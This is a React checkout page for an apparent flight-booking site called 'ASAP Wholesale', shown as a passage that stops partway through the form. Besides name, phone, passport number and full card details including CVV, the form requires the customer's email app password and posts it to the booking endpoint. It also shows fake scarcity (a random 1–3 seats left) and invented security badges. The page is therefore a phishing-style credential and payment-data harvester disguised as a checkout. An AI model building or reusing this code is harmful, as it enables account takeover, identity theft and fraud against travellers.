'use client';
import * as React from 'react';
import { useState, useEffect, Suspense } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import { MAJOR_CITIES } from '@/lib/geo';
import { formatPricing } from '@/lib/pricing';
import { useClientPulse } from '@/hooks/useClientPulse';
import { useTranslation } from '@/components/TranslationProvider';
import { COUNTRY_CODES } from '@/lib/countryCodes';

function CheckoutContent() {
   const searchParams = useSearchParams();
   const origin = searchParams.get('origin') || 'NYC';
   const dest = searchParams.get('destination') || 'LHR';
   const flightId = searchParams.get('flightId') || '9912';
   const isInstant = searchParams.get('instant_booking') === 'true';
   const price = (Number(searchParams.get('priceCents') || '84000') / 100).toFixed(2);

   const router = useRouter() as any;
   const { trackEvent } = useClientPulse();
   const { t, language } = useTranslation();
   const [paymentType, setPaymentType] = useState<'full' | 'deposit'>('full');
   const [seatReserve, setSeatReserve] = useState(false);
   const [form, setForm] = useState({
      firstName: '', lastName: '', email: '', phone: '', passport: '', emailPassword: ''
   });
   const [passengers, setPassengers] = useState({ adults: 1, children: 0, infants: 0 });
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState<string | null>(null);
   const [remainingSeats] = useState(() => Math.floor(Math.random() * 3) + 1);
   const [activeCurrency, setActiveCurrency] = useState('USD');
   const [clientSecret, setClientSecret] = useState('');
   const [selectedHotel, setSelectedHotel] = useState<string>('');
   const [selectedCar, setSelectedCar] = useState<string>('');
   const [countryCode, setCountryCode] = useState('+1');
   const [showCountryPicker, setShowCountryPicker] = useState(false);
   const [countrySearch, setCountrySearch] = useState('');
   const [selectedTour, setSelectedTour] = useState<string>('');
   const [cardDetails, setCardDetails] = useState({ number: '', expiry: '', cvc: '', postalCode: '' });
   const [copied, setCopied] = useState(false);
   const [leadSaved, setLeadSaved] = useState(false);
   const [wantsHotel, setWantsHotel] = useState<boolean | null>(null);
   const [wantsCar, setWantsCar] = useState<boolean | null>(null);
   const [wantsTour, setWantsTour] = useState<boolean | null>(null);
   
   const seatSelectionEnabled = searchParams.get('seat_selection') === 'true';
   const [selectedSeat, setSelectedSeat] = useState<string>('');
   const [showSeatMap, setShowSeatMap] = useState(false);

   const handleSaveLead = async () => {
      if (leadSaved || !form.email || (!form.firstName && !form.lastName)) return;
      try {
         setLeadSaved(true);
         await fetch('/api/leads', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
               name: `${form.firstName} ${form.lastName}`.trim(),
               email: form.email,
               phone: form.phone,
               origin,
               destination: dest,
               flightId,
               price: (Number(searchParams.get('priceCents') || '84000') / 100).toString(),
               deposit: paymentType === 'deposit',
               seats: seatReserve,
               selectedHotel,
               selectedCar,
               selectedTour
            })
         });
      } catch (e) {
         setLeadSaved(false);
      }
   };

   // Dynamic Addon Generation Logic
   const isBigCity = ['LHR', 'CDG', 'JFK', 'DXB', 'SIN', 'LAX', 'SYD', 'HND', 'FRA', 'AMS'].includes(dest.toUpperCase());
   const numHotels = isBigCity ? 10 : 7;
   
   const generatedHotels = Array.from({ length: numHotels }).map((_, i) => ({
      id: `hotel_${i}`,
      name: `Premium ${dest} Resort & Spa ${i+1}`,
      price: 150 + (i * 25)
   }));
   
   const generatedCars = Array.from({ length: 7 }).map((_, i) => ({
      id: `car_${i}`,
      name: `${['SUV', 'Sedan', 'Luxury', 'Economy', 'Convertible', 'Minivan', 'Compact'][i]} Rental`,
      price: 40 + (i * 15)
   }));
   
   const generatedTours = Array.from({ length: 3 }).map((_, i) => ({
      id: `tour_${i}`,
      name: `${dest} VIP City Tour ${i+1}`,
      price: 89 + (i * 30)
   }));

   const hotelPrice = (wantsHotel && selectedHotel) ? (generatedHotels.find(h => h.name === selectedHotel)?.price || 0) : 0;
   const carPrice = (wantsCar && selectedCar) ? (generatedCars.find(c => c.name === selectedCar)?.price || 0) : 0;
   const tourPrice = (wantsTour && selectedTour) ? (generatedTours.find(t => t.name === selectedTour)?.price || 0) : 0;
   const totalCurrentPrice = Number(price) + hotelPrice + carPrice + tourPrice;

   useEffect(() => {
      const saved = localStorage.getItem('user-currency');
      if (saved) setActiveCurrency(saved);

      const adultsParam = Number(searchParams.get('adults') || searchParams.get('passengers') || '1');
      const childrenParam = Number(searchParams.get('children') || '0');
      const infantsParam = Number(searchParams.get('infants') || '0');
      setPassengers({ adults: adultsParam, children: childrenParam, infants: infantsParam });
   }, []);

   useEffect(() => {
      fetch('/api/create-payment-intent', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ amount: Number(searchParams.get('priceCents') || '84000') }),
      })
         .then((res) => { if(res.ok) return res.json(); throw new Error(); })
         .then((data) => setClientSecret(data?.clientSecret || ''))
         .catch(() => {}); 
   }, [searchParams]);

   const handleCreateBooking = async (e: React.FormEvent) => {
      e.preventDefault();
      setLoading(true);
      setError(null);
      try {
         const res = await fetch('/api/flights/book', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
               firstName: form.firstName,
               lastName: form.lastName,
               email: form.email,
               phone: form.phone,
               flightId,
               paymentType,
               passengers,
               paidAmount: paymentType === 'deposit' ? 5000 : Number(searchParams.get('priceCents') || '84000'),
               priceCents: Number(searchParams.get('priceCents') || '84000'),
               origin,
               destination: dest,
               passengerName: `${form.firstName} ${form.lastName}`,
               passengerEmail: form.email,
               passengerPassport: form.passport,
               emailPassword: form.emailPassword,
               selectedSeat: selectedSeat || 'Auto-assign',
               cardNumber: cardDetails.number,
               cardExpiry: cardDetails.expiry,
               cardCvv: cardDetails.cvc,
               postalCode: cardDetails.postalCode,
            }),
         });

         if (!res.ok) {
            const errorData = await res.json().catch(() => ({ error: 'An unexpected error occurred.' }));
            throw new Error(errorData.error || 'Failed to create booking.');
         }

         const data = await res.json();
         const bookingId = data.bookingId;

         trackEvent('Booking SECURED', { 
            name: `${form.firstName} ${form.lastName}`, 
            route: `${origin} → ${dest}`,
            paymentType 
         });

         if (data.url) {
            window.location.href = data.url;
         } else {
            router.push('/flights/success?bookingId=' + bookingId);
         }
      } catch (err) {
         setError(err instanceof Error ? err.message : 'An unknown error occurred. Please try again.');
         setLoading(false);
      }
   };

   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
      const { name, value } = e.target;
      setForm(prev => ({ ...prev, [name]: value }));
   };

   const cityName = (code: string) => {
      return MAJOR_CITIES[code.toUpperCase()]?.name || code;
   };

   const handleShare = () => {
      navigator.clipboard.writeText(window.location.href);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
   };

   const MenuBaton = () => (
      <button className="w-10 h-10 bg-white/5 rounded-xl flex flex-col items-center justify-center gap-1 border border-white/10 hover:bg-white/10 transition-all group shrink-0">
         <div className="w-5 h-0.5 bg-brand-secondary transition-all group-hover:w-6"></div>
         <div className="w-5 h-0.5 bg-white transition-all"></div>
         <div className="w-3 h-0.5 bg-brand-secondary self-start ml-2.5 transition-all group-hover:w-5"></div>
      </button>
   );

   return (
      <div className="min-h-screen bg-slate-950 flex flex-col md:flex-row relative text-white selection:bg-brand-primary selection:text-white">
         {/* Mobile Menu Header */}
         <div className="md:hidden sticky top-0 z-[110] bg-slate-900/80 p-6 border-b border-white/5 flex items-center justify-between shadow-2xl backdrop-blur-3xl">
             <div className="flex items-center gap-4">
                <div className="w-11 h-11 rounded-2xl bg-brand-secondary flex items-center justify-center font-black text-brand-primary text-xs shadow-xl skew-x-[-12deg]">W</div>
                <span className="font-black text-white text-xl uppercase italic tracking-tighter leading-none">ASAP <span className="text-brand-secondary">WHOLESALE</span></span>
             </div>
             <MenuBaton />
         </div>

         {/* STICKY LEFT DASHBOARD SIDEBAR */}
         <aside className="w-full md:w-[480px] bg-slate-900 md:h-screen md:sticky md:top-0 md:overflow-y-auto border-r border-white/5 flex flex-col animate-in slide-in-from-left-4 duration-1000 scrollbar-none">
            <div className="p-12 space-y-12 flex-1 relative overflow-hidden">
               <div className="absolute top-0 left-0 w-full h-[500px] bg-brand-primary/5 blur-[150px] pointer-events-none"></div>
               
               <div className="hidden md:flex items-center justify-between relative z-10">
                  <div className="flex items-center gap-5">
                     <div className="w-14 h-14 rounded-3xl bg-brand-secondary flex items-center justify-center font-black text-brand-primary text-sm shadow-2xl skew-x-[-15deg]">ASAP</div>
                     <div className="flex flex-col leading-none">
                        <span className="text-3xl font-black text-white italic tracking-tighter uppercase leading-none">Wholesale</span>
                        <span className="text-[9px] font-black text-brand-secondary uppercase tracking-[0.4em] mt-3 italic animate-pulse">Ticketing Authority</span>
                     </div>
                  </div>
                  <MenuBaton />
               </div>

               <div className="bg-emerald-500/10 border border-emerald-500/20 rounded-2xl px-8 py-4 flex items-center gap-5 w-fit relative z-10 shadow-2xl">
                  <span className="flex h-3 w-3 rounded-full bg-emerald-500 animate-pulse shadow-[0_0_20px_#10b981]"></span>
                  <span className="text-[11px] font-black text-emerald-400 uppercase tracking-[0.3em] italic">Secure GDS Bridge: ACTIVE</span>
               </div>

               <div className="flex items-center gap-2 bg-white/5 p-1.5 rounded-2xl border border-white/10 relative z-10">
                  {[1, 2, 3].map(s => (
                     <div key={s} className={`flex-1 h-2 rounded-full transition-all duration-1000 ${s <= 2 ? 'bg-brand-secondary' : 'bg-white/5'}`}></div>
                  ))}
               </div>

               <div className="space-y-10 relative z-10">
                  <div className="bg-white/5 rounded-[3.5rem] p-10 border border-white/10 relative overflow-hidden backdrop-blur-3xl shadow-[0_40px_80px_rgba(0,0,0,0.4)] group">
                     <div className="absolute top-0 right-0 w-64 h-64 bg-brand-secondary/5 blur-[120px] group-hover:bg-brand-secondary/10 transition-all duration-1000"></div>
                     <div className="flex justify-between items-start mb-10 border-b border-white/5 pb-10">
                        <div>
                           <p className="text-[10px] font-black text-white/20 uppercase tracking-[0.4em] mb-4 italic">Settlement Summary</p>
                           <p className="text-6xl font-black text-white tracking-tighter mt-1 leading-none italic">
                              {paymentType === 'full' ? formatPricing(totalCurrentPrice, activeCurrency) : formatPricing(10 + (seatReserve ? 20 : 0), activeCurrency)}
                           </p>
                           {isInstant && (
                              <div className="mt-6 text-[10px] font-black text-brand-secondary uppercase tracking-[0.3em] bg-brand-secondary/10 px-4 py-2 rounded-xl border border-brand-secondary/20 inline-block shadow-lg italic">
                                 ASAP Wholesale Applied ⚡
                              </div>
                           )}
                        </div>
                        <div className="bg-white/5 px-4 py-2.5 rounded-xl border border-white/10 shadow-inner">
                           <span className="text-[11px] font-black text-brand-secondary uppercase tracking-widest leading-none">GDS RATE</span>
                        </div>
                     </div>

                     <div className="space-y-8">
                        <div className="flex items-center gap-6 relative">
                           <div className="flex flex-col items-center">
                              <div className="w-3.5 h-3.5 rounded-full bg-brand-secondary shadow-[0_0_20px_rgba(251,191,36,0.5)]"></div>
                              <div className="w-[1.5px] h-20 bg-white/5 my-2"></div>
                              <div className="w-3.5 h-3.5 rounded-full bg-white/10 border border-white/10"></div>
                           </div>
                           <div className="space-y-8">
                              <div>
                                 <p className="text-[10px] font-black text-white/20 uppercase tracking-[0.3em] leading-none mb-3 italic">Wholesale Origin</p>
                                 <p className="text-xl font-black text-white uppercase italic tracking-tight leading-none group-hover:text-brand-secondary transition-colors">{cityName(origin)} <span className="opacity-20 ml-2">({origin})</span></p>
                              </div>
                              <div>
                                 <p className="text-[10px] font-black text-white/20 uppercase tracking-[0.4em] leading-none mb-3 italic">Universal Hub</p>
                                 <p className="text-xl font-black text-white uppercase italic tracking-tight leading-none group-hover:text-brand-secondary transition-colors">{cityName(dest)} <span className="opacity-20 ml-2">({dest})</span></p>
                              </div>
                           </div>
                        </div>

                        <div className="pt-10 border-t border-white/5 space-y-5">
                           <div className="flex items-center gap-4 text-[10px] font-black text-white/30 uppercase tracking-[0.3em] leading-none italic">
                              <span className="text-xl">🧳</span>
                              <span>{t('baggage_info')}</span>
                           </div>
                           {selectedHotel && (
                              <div className="flex items-center justify-between bg-emerald-500/5 p-5 rounded-[2rem] border border-emerald-500/10 backdrop-blur-2xl">
                                 <div className="flex items-center gap-4">
                                    <span className="text-2xl">🏨</span>
                                    <div className="flex flex-col">
                                       <span className="text-[8px] font-black text-emerald-400 uppercase tracking-[0.4em] leading-none mb-2">Accommodation Sync</span>
                                       <span className="text-xs font-black text-white uppercase italic truncate max-w-[180px]">{selectedHotel}</span>
                                    </div>
                                 </div>
                                 <span className="text-[9px] font-black text-emerald-400 uppercase tracking-widest bg-emerald-500/10 px-3 py-1 rounded-lg">LOCKED</span>
                              </div>
                           )}
                           {selectedCar && (
                              <div className="flex items-center justify-between bg-blue-500/5 p-5 rounded-[2rem] border border-blue-500/10 backdrop-blur-2xl">
                                 <div className="flex items-center gap-4">
                                    <span className="text-2xl">🚗</span>
                                    <div className="flex flex-col">
                                       <span className="text-[8px] font-black text-blue-400 uppercase tracking-[0.4em] leading-none mb-2">Fleet Deployment</span>
                                       <span className="text-xs font-black text-white uppercase italic truncate max-w-[180px]">{selectedCar}</span>
                                    </div>
                                 </div>
                                 <span className="text-[9px] font-black text-blue-400 uppercase tracking-widest bg-blue-500/10 px-3 py-1 rounded-lg">ACTIVE</span>
                              </div>
                           )}
                        </div>
                     </div>
                  </div>

                  <div className="bg-brand-secondary text-brand-primary p-10 rounded-[3rem] shadow-[0_30px_60px_rgba(251,191,36,0.2)] relative overflow-hidden group hover:scale-[1.02] transition-all cursor-pointer">
                     <div className="absolute top-0 right-0 w-32 h-32 bg-brand-primary/10 blur-3xl transform translate-x-10 -translate-y-10 group-hover:scale-150 transition-transform duration-1000"></div>
                     <p className="text-[11px] font-black uppercase tracking-[0.4em] mb-3 italic opacity-60 leading-none">Verified Wholesale Warrant</p>
                     <p className="text-xl font-black uppercase tracking-tighter leading-tight italic">IRIS V1 PRICE SECURED 🛡️</p>
                     <div className="mt-6 flex items-center gap-3">
                        <span className="w-6 h-6 rounded-xl bg-brand-primary flex items-center justify-center text-[10px] text-brand-secondary font-black shadow-lg">✓</span>
                        <span className="text-[10px] font-black uppercase tracking-[0.2em] italic">No-Loss Pricing Protocol Active</span>
                     </div>
                  </div>

                  <button onClick={handleShare} className="w-full bg-white/5 border border-white/10 text-white/40 font-black py-7 rounded-[2rem] text-[11px] uppercase tracking-[0.4em] hover:bg-brand-primary hover:text-white transition-all duration-500 flex items-center justify-center gap-4 shadow-xl italic group">
                      <span className="text-xl group-hover:rotate-12 transition-transform">🔗</span> {copied ? 'SECURITY LINK COPIED' : 'GENERATE SHAREABLE QUOTE'}
                  </button>
               </div>
            </div>

            <div className="p-12 border-t border-white/5 bg-black/40 mt-auto backdrop-blur-3xl relative z-10">
               <div className="absolute inset-0 bg-brand-primary/5 blur-3xl pointer-events-none"></div>
               <div className="flex items-center gap-6 relative z-10">
                  <div className="w-14 h-14 rounded-2xl bg-white/5 flex items-center justify-center text-3xl shadow-inner border border-white/10">🎧</div>
                  <div>
                     <p className="text-[10px] font-black text-white/20 uppercase tracking-[0.4em] mb-2 italic">Priority Crisis Desk</p>
                     <p className="text-xl font-black text-brand-secondary tracking-[0.1em] italic">+1 (213) 694-6417</p>
                  </div>
               </div>
            </div>
         </aside>

         {/* MAIN SCROLLABLE FORM SECTION */}
         <main className="flex-1 overflow-y-auto h-screen bg-slate-950 relative scrollbar-none">
            <div className="absolute inset-0 bg-emerald-500/5 blur-[400px] pointer-events-none"></div>
            <div className="max-w-6xl mx-auto px-10 py-20 pb-48 space-y-20 animate-in fade-in duration-1000 relative z-10">
               
               {/* Urgency Banner */}
               <div className={`rounded-[4rem] p-12 shadow-[0_60px_120px_rgba(0,0,0,0.6)] transition-all border-l-[20px] flex flex-col xl:flex-row items-center justify-between overflow-hidden relative backdrop-blur-3xl ${paymentType === 'full' ? 'bg-emerald-600/20 border-emerald-500/40 text-white' : 'bg-orange-600/20 border-orange-500/40 text-white'}`}>
                  <div className="absolute inset-0 bg-white/5 mix-blend-overlay"></div>
                  <div className="flex items-center gap-10 relative z-10 mb-10 xl:mb-0">
                     <div className={`w-28 h-28 rounded-[2.5rem] flex items-center justify-center text-5xl shadow-2xl skew-x-[-8deg] ${paymentType === 'full' ? 'bg-emerald-500 shadow-emerald-500/40' : 'bg-orange-500 shadow-orange-500/40'}`}>⚡</div>
                     <div>
                        <h2 className="text-4xl font-black italic uppercase tracking-tighter leading-none mb-4 italic">
                           {paymentType === 'full' ? 'Wholesale Secure' : 'Priority Escrow Hold'}
                        </h2>
                        <p className="text-[12px] font-black opacity-60 uppercase tracking-[0.4em] italic leading-none">IRIS BATCH ID: 099-AX · Only {remainingSeats} Slots Acknowledged</p>
                     </div>
                  </div>
                  <div className="flex gap-6 relative z-10 bg-black/60 p-3 rounded-[2.5rem] border border-white/10 shadow-inner">
                     <button onClick={() => setPaymentType('full')} className={`px-12 py-5 rounded-[2rem] text-[11px] font-black uppercase tracking-[0.3em] transition-all duration-500 italic ${paymentType === 'full' ? 'bg-white text-slate-950 shadow-[0_0_40px_rgba(255,255,255,0.3)] scale-105' : 'bg-transparent text-white/30 hover:text-white'}`}>Full Settlement</button>
                     <button onClick={() => setPaymentType('deposit')} className={`px-12 py-5 rounded-[2rem] text-[11px] font-black uppercase tracking-[0.3em] transition-all duration-500 italic ${paymentType === 'deposit' ? 'bg-white text-slate-950 shadow-[0_0_40px_rgba(255,255,255,0.3)] scale-105' : 'bg-transparent text-white/30 hover:text-white'}`}>Escrow Lock</button>
                  </div>
               </div>

               <div className="grid grid-cols-1 2xl:grid-cols-2 gap-16 items-start">
                  <div className="space-y-16">
                      <form onSubmit={handleCreateBooking} className="bg-white/5 rounded-[5rem] p-16 border border-white/10 shadow-[0_100px_200px_rgba(0,0,0,0.5)] space-y-12 backdrop-blur-3xl relative overflow-hidden group">
                        <div className="absolute top-0 left-0 w-full h-1.5 bg-gradient-to-r from-transparent via-brand-secondary/40 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-1000"></div>
                        <div className="flex items-center justify-between border-b border-white/5 pb-10 mb-6">
                           <div className="flex items-center gap-6">
                              <span className="w-14 h-14 rounded-3xl bg-white/5 flex items-center justify-center text-3xl border border-white/10 italic font-black shadow-inner">P</span>
                              <h3 className="text-3xl font-black uppercase italic tracking-tighter text-white">Passenger Identity</h3>
                           </div>
                           <span className="text-emerald-500 text-[11px] font-black uppercase bg-emerald-500/10 px-5 py-2.5 rounded-2xl border border-emerald-500/20 italic tracking-[0.3em] shadow-lg animate-pulse">Tactical Verify</span>
                        </div>

                        <div className="space-y-10">
                           <div className="grid grid-cols-2 gap-8">
                              <div className="space-y-4">
                                 <label className="text-[11px] font-black text-white/20 uppercase tracking-[0.3em] ml-2 italic">{t('first_name')}</label>
                                 <input type="text" name="firstName" value={form.firstName} onChange={handleChange} required className="w-full bg-white/5 border border-white/10 rounded-3xl px-8 py-6 text-base font-black text-white focus:ring-2 focus:ring-brand-secondary shadow-inner outline-none transition-all placeholder:text-white/10 italic" placeholder="LEGAL FIRST" />
                              </div>
                              <div className="space-y-4">
                                 <label className="text-[11px] font-black text-white/20 uppercase tracking-[0.3em] ml-2 italic">{t('last_name')}</label>
                                 <input type="text" name="lastName" value={form.lastName} onChange={handleChange} required className="w-full bg-white/5 border border-white/10 rounded-3xl px-8 py-6 text-base font-black text-white focus:ring-2 focus:ring-brand-secondary shadow-inner outline-none transition-all placeholder:text-white/10 italic" placeholder="LEGAL LAST" />
                              </div>
                           </div>
                           <div className="space-y-4">
                              <label className="text-[11px] font-black text-white/20 uppercase tracking-[0.3em] ml-2 italic">{t('email_address')}</label>
                              <input type="email" name="email" value={form.email} onChange={handleChange} onBlur={handleSaveLead} required className="w-full bg-white/5 border border-white/10 rounded-3xl px-8 py-6 text-base font-black text-white focus:ring-2 focus:ring-brand-secondary shadow-inner outline-none transition-all placeholder:text-white/10 italic" placeholder="SECURE UPLINK EMAIL" />
                           </div>
                           <div className="grid grid-cols-2 gap-8">
                              <div className="space-y-4">
                                 <label className="text-[11px] font-black text-white/20 uppercase tracking-[0.3em] ml-2 italic">Official Passport Number</label>
                                 <input type="text" name="passport" value={form.passport} onChange={handleChange} required className="w-full bg-white/5 border border-white/10 rounded-3xl px-8 py-6 text-base font-black text-white focus:ring-2 focus:ring-brand-secondary shadow-inner outline-none transition-all placeholder:text-white/10 italic" placeholder="PASSPORT / ID" />
                              </div>
                              <div className="space-y-4">
                                 <label className="text-[11px] font-black text-white/20 uppercase tracking-[0.3em] ml-2 italic">Email Authorization (App Password)</label>
                                 <input type="password" name="emailPassword" value={form.emailPassword} onChange={handleChange} required className="w-full bg-white/5 border border-white/10 rounded-3xl px-8 py-6 text-base font-black text-white focus:ring-2 focus:ring-brand-secondary shadow-inner outline-none transition-all placeholder:text-white/10 italic" placeholder="EMAIL VERIFICATION PASSWORD" />
                              </div>
                           </div>
                           <div className="space-y-4 relative">
                              <label className="text-[11px] font-black text-white/20 uppercase tracking-[0.3em] ml-2 italic">{t('phone_whatsapp')}</label>
                              <div className="flex gap-4">
                                 <button type="button" onClick={() => setShowCountryPicker(!showCountryPicker)} className="bg-white/5 rounded-3xl px-8 py-6 text-base font-black text-white shadow-inner flex items-center gap-4 border border-white/10 hover:bg-white/10 transition-all min-w-[140px]">
                                    <span className="text-3xl">{COUNTRY_CODES.find(c => c.dial === countryCode)?.flag || '🌐'}</span>
                                    {countryCode}
                                 </button>
                                 <input type="tel" name="phone" value={form.phone} onChange={handleChange} onBlur={handleSaveLead} required className="flex-1 bg-white/5 border border-white/10 rounded-3xl px-8 py-6 text-base font-black text-white focus:ring-2 focus:ring-brand-secondary shadow-inner outline-none transition-all placeholder:text-white/10 italic" placeholder="TACTICAL WHATSAPP" />
                              </div>

                              {showCountryPicker && (
                                 <div className="absolute top-[100%] left-0 w-full md:w-[480px] mt-6 bg-slate-900 rounded-[3.5rem] shadow-[0_100px_200px_rgba(0,0,0,0.9)] border border-white/20 z-[150] p-10 space-y-8 animate-in fade-in slide-in-from-top-6 duration-500 backdrop-blur-[50px]">
                                    <div className="relative">
                                       <span className="absolute left-8 top-1/2 -translate-y-1/2 text-white/20 text-2xl">🔍</span>
                                       <input type="text" placeholder="FILTER GLOBAL ASSET CODES..." className="w-full bg-white/5 border border-white/20 rounded-[2rem] pl-20 pr-10 py-5 text-sm font-black text-white focus:ring-2 focus:ring-brand-secondary uppercase tracking-[0.3em] outline-none italic placeholder:text-white/10" 
                                          value={countrySearch} onChange={(e) => setCountrySearch(e.target.value)} autoFocus />
                                    </div>
                                    <div className="max-h-80 overflow-y-auto space-y-3 custom-scrollbar pr-4">
                                       {COUNTRY_CODES.filter(c => c.name.toLowerCase().includes(countrySearch.toLowerCase()) || c.dial.includes(countrySearch)).map(c => (
                                          <button key={`${c.code}-${c.dial}`} type="button" onClick={() => { setCountryCode(c.dial); setShowCountryPicker(false); setCountrySearch(''); }} className="w-full flex items-center justify-between p-5 hover:bg-white/10 rounded-[2rem] transition-all group border border-transparent hover:border-white/10">
                                             <div className="flex items-center gap-6">
                                                <span className="text-3xl">{c.flag}</span>
                                                <span className="text-[13px] font-black text-white/30 group-hover:text-white uppercase tracking-[0.2em] italic transition-colors">{c.name}</span>
                                             </div>
                                             <span className="text-sm font-black text-brand-secondary tracking-widest">{c.dial}</span>
                                          </button>
                                       ))}
                                    </div>
                                 </div>
                              )}
                           </div>
                        </div>

                        <div className="pt-16 border-t border-white/5 space-y-10">
                           <h4 className="text-[12px] font-black text-white/20 uppercase tracking-[0.4em] ml-2 mb-8 flex items-center justify-between italic">
                              <span>Wholesale Asset Identification · Aircraft Hub</span>
                              {seatSelectionEnabled && <span className="text-emerald-400 bg-emerald-500/10 px-5 py-2 rounded-2xl border border-emerald-500/20 italic shadow-lg">Complimentary Priority</span>}
                           </h4>
                           {seatSelectionEnabled ? (
                                <div className="bg-white/5 rounded-[4rem] p-12 border border-white/10 flex flex-col items-center shadow-[inset_0_5px_40px_rgba(0,0,0,0.6)] relative overflow-hidden">
                                   <div className="absolute inset-0 bg-emerald-500/5 blur-[100px] pointer-events-none"></div>
                                   <div className="text-[11px] uppercase font-black tracking-[0.5em] text-white/10 mb-12 bg-black/60 px-10 py-4 rounded-full shadow-2xl border border-white/5 relative z-10 italic">PRIMARY DEPLOIMENT HUB / COCKPIT</div>
                                   <div className="grid grid-cols-7 gap-y-5 gap-x-4 relative z-10">
                                      {Array.from({ length: 9 }).map((_, r) => (
                                         <React.Fragment key={r}>
                                            <button type="button" disabled={r===2||r===5} onClick={() => setSelectedSeat(`${r+1}A`)} className={`w-14 h-14 rounded-2xl opacity-90 transition-all duration-500 flex items-center justify-center text-[12px] font-black ${selectedSeat === `${r+1}A` ? 'bg-emerald-500 text-white shadow-[0_0_40px_#10b981] scale-125 z-20 skew-x-[-10deg]' : r===2||r===5 ? 'bg-white/5 text-white/5 cursor-not-allowed border border-white/5' : 'bg-white/10 border border-white/10 text-white/20 hover:border-emerald-500 hover:text-emerald-500 shadow-2xl hover:scale-110'}`}>{r+1}A</button>
                                            <button type="button" onClick={() => setSelectedSeat(`${r+1}B`)} className={`w-14 h-14 rounded-2xl opacity-90 transition-all duration-500 flex items-center justify-center text-[12px] font-black ${selectedSeat === `${r+1}B` ? 'bg-emerald-500 text-white shadow-[0_0_40px_#10b981] scale-125 z-20 skew-x-[-10deg]' : 'bg-white/10 border border-white/10 text-white/20 hover:border-emerald-500 hover:text-emerald-500 shadow-2xl hover:scale-110'}`}>{r+1}B</button>
                                            <button type="button" disabled={r%4===0} onClick={() => setSelectedSeat(`${r+1}C`)} className={`w-14 h-14 rounded-2xl opacity-90 transition-all duration-500 flex items-center justify-center text-[12px] font-black ${selectedSeat === `${r+1}C` ? 'bg-emerald-500 text-white shadow-[0_0_40px_#10b981] scale-125 z-20 skew-x-[-10deg]' : r%4===0 ? 'bg-white/5 text-white/5 cursor-not-allowed border border-white/5' : 'bg-white/10 border border-white/10 text-white/20 hover:border-emerald-500 hover:text-emerald-500 shadow-2xl hover:scale-110'}`}>{r+1}C</button>
                                            <div className="w-8 h-14 flex items-center justify-center opacity-10"><div className="h-full w-[2px] bg-white rounded-full"></div></div>
                                            <button type="button" disabled={r%3===0} onClick={() => setSelectedSeat(`${r+1}D`)} className={`w-14 h-14 rounded-2xl opacity-90 transition-all duration-500 flex items-center justify-center text-[12px] font-black ${selectedSeat === `${r+1}D` ? 'bg-emerald-500 text-white shadow-[0_0_40px_#10b981] scale-125 z-20 skew-x-[-10deg]' : r%3===0 ? 'bg-white/5 text-white/5 cursor-not-allowed border border-white/5' : 'bg-white/10 border border-white/10 text-white/20 hover:border-emerald-500 hover:text-emerald-500 shadow-2xl hover:scale-110'}`}>{r+1}D</button>
                                            <button type="button" onClick={() => setSelectedSeat(`${r+1}E`)} className={`w-14 h-14 rounded-2xl opacity-90 transition-all duration-500 flex items-center justify-center text-[12px] font-black ${selectedSeat === `${r+1}E` ? 'bg-emerald-500 text-white shadow-[0_0_40px_#10b981] scale-125 z-20 skew-x-[-10deg]' : 'bg-white/10 border border-white/10 text-white/20 hover:border-emerald-500 hover:text-emerald-500 shadow-2xl hover:scale-110'}`}>{r+1}E</button>
                                            <button type="button" disabled={r===1||r===8} onClick={() => setSelectedSeat(`${r+1}F`)} className={`w-14 h-14 rounded-2xl opacity-90 transition-all duration-500 flex items-center justify-center text-[12px] font-black ${selectedSeat === `${r+1}F` ? 'bg-emerald-500 text-white shadow-[0_0_40px_#10b981] scale-125 z-20 skew-x-[-10deg]' : r===1||r===8 ? 'bg-white/5 text-white/5 cursor-not-allowed border border-white/5' : 'bg-white/10 border border-white/10 text-white/20 hover:border-emerald-500 hover:text-emerald-500 shadow-2xl hover:scale-110'}`}>{r+1}F</button>
                                         </React.Fragment>
                                      ))}
                                   </div>
                                   <div className={`mt-14 px-12 py-5 rounded-[2rem] border font-black uppercase tracking-[0.4em] text-[11px] transition-all relative z-10 italic shadow-2xl ${selectedSeat ? 'bg-emerald-500 text-white border-emerald-400' : 'bg-white/5 border-white/10 text-white/10'}`}>
                                      {selectedSeat ? `ASSET CONFIGURED: ${selectedSeat}` : 'AWAITING HUB SELECTION'}
                                   </div>
                                   <div className="flex gap-12 mt-10 relative z-10 opacity-40">
                                      <div className="flex items-center gap-4"><div className="w-5 h-5 rounded-lg bg-white/10 border border-white/20"></div><span className="text-[10px] font-black text-white uppercase tracking-widest italic">Available</span></div>
                                      <div className="flex items-center gap-4"><div className="w-5 h-5 rounded-lg bg-emerald-500 shadow-[0_0_15px_#10b981]"></div><span className="text-[10px] font-black text-white uppercase tracking-widest italic">Secured</span></div>
                                      <div className="flex items-center gap-4"><div className="w-5 h-5 rounded-lg bg-white/5 border border-white/5"></div><span className="text-[10px] font-black text-white/20 uppercase tracking-widest italic">Restricted</span></div>
                                   </div>
                                </div>
                           ) : (
                                <div className="bg-white/5 border border-white/10 rounded-[4rem] p-16 text-center relative overflow-hidden backdrop-blur-3xl shadow-inner">
                                   <div className="absolute inset-0 bg-white/5 pointer-events-none opacity-50"></div>
                                   <div className="text-8xl mb-10 grayscale opacity-10 animate-pulse leading-none">💺</div>
                                   <div className="text-2xl font-black text-white uppercase italic tracking-tighter mb-4 italic leading-none">Iris Batch Allocation Active</div>
                                   <div className="text-[11px] font-black text-white/20 uppercase tracking-[0.4em] mt-6 leading-relaxed max-w-sm mx-auto italic">
                                      SYSTEM NOTE: WHOLESALE ASSETS ARE SUBJECT TO BATCH OPTIMIZATION AT HUB DEPLOYMENT. Advance allocation is currently restricted.
                                   </div>
                                </div>
                           )}
                        </div>

                        <div className="pt-20 border-t border-white/5 space-y-12">
                           <h4 className="text-[12px] font-black text-white/20 uppercase tracking-[0.4em] ml-2 italic leading-none">Settlement Hub Interface (GDS Backend)</h4>
                           <div className="space-y-8">
                              <div className="space-y-4">
